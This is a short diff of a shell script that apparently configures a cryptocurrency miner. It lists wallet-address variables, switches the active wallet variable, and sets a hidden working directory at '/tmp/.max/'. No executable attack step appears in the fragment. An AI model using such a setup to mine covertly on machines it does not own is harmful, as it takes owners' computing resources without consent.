@@ -54,7 +54,7 @@ W_DG="D5EcMFZqLsd4CdZipk3LXviX8YUzEEfBj7"
 W_DG2="DSro3i42vz2MytCw22S4wun5qM5bTNNy5c"
 
 
-W_VC=$W_DG
+W_VC=$W_RV
 
 # Directory
 Work_Dir="/tmp/.max/"
